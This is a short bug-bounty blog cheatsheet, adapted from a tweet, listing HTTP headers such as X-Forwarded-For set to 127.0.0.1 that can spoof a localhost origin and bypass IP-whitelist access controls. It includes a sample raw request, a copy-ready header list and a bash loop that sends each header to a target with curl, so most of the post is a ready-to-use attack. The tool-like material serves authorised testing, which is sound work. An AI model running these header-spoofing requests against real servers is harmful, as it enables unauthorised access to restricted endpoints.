---
layout: post
title: "Cheatsheet: Auth Bypass Headers"
date: 2022-08-07 11:15 +0100
categories: [Cheatsheets]
tags: bugbounty web hacking cheatsheet
published: true
---

Adapted from this tweet:

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">I have found multiple auth bypass issues using below Headers<a href="https://twitter.com/hashtag/bugbountytips?src=hash&amp;ref_src=twsrc%5Etfw">#bugbountytips</a> <a href="https://twitter.com/hashtag/bugbounty?src=hash&amp;ref_src=twsrc%5Etfw">#bugbounty</a> <a href="https://t.co/R82TXWiyDX">pic.twitter.com/R82TXWiyDX</a></p>&mdash; ¯\_(ツ)_/¯85 (@BountyOverflow) <a href="https://twitter.com/BountyOverflow/status/1555786315232206848?ref_src=twsrc%5Etfw">August 6, 2022</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> 

The following headers can potentially be used to bypass authentication on a webserver.

- X-Forwarded: 127.0.0.1
- X-Forwarded-By: 127.0.0.1
- X-Forwarded-For: 127.0.0.1
- X-Forwarded-For-Original: 127.0.0.1
- X-Forwarder-For: 127.0.0.1
- X-Forward-For: 127.0.0.1
- Forwarded-For: 127.0.0.1
- Forwarded-For-Ip: 127.0.0.1
- X-Custom-IP-Authorization: 127.0.0.1
- X-Originating-Ip: 127.0.0.1
- X-Remote-IP: 127.0.0.1
- X-Remote-Addr: 127.0.0.1
- X-Trusted-IP: 127.0.0.1
- X-Requested-By: 127.0.0.1
- X-Requested-For: 127.0.0.1

## Example Usage

Scenario: You try to access `/login` and get a custom `401` response that says something like:

`IP not on Whitelist!`

(not a likely response but serves as an example)

You'd then try and send the following request:

```bash
GET /login HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Host: bullsec.xyz
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
X-Forwarded-For: 127.0.0.1
```

> That endpoint doesn't exist on this site this is not a lab.
{: .prompt-warning}

The idea is that the webserver will parse the `X-Forwarded-For` header and assume that the request has been forwarded to it on behalf of `127.0.0.1` / `localhost` and let you access the "Blocked" `/login` endpoint. 

## Automation Block

```bash
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Trusted-IP: 127.0.0.1
X-Requested-By: 127.0.0.1
X-Requested-For: 127.0.0.1
```

> Copy the above into a text file

```bash
TARGET=<target-ip-address>
for x in $(cat headers.txt);do curl -v $TARGET -H "$x" ; done
```

That's your lot.

Enjoy,
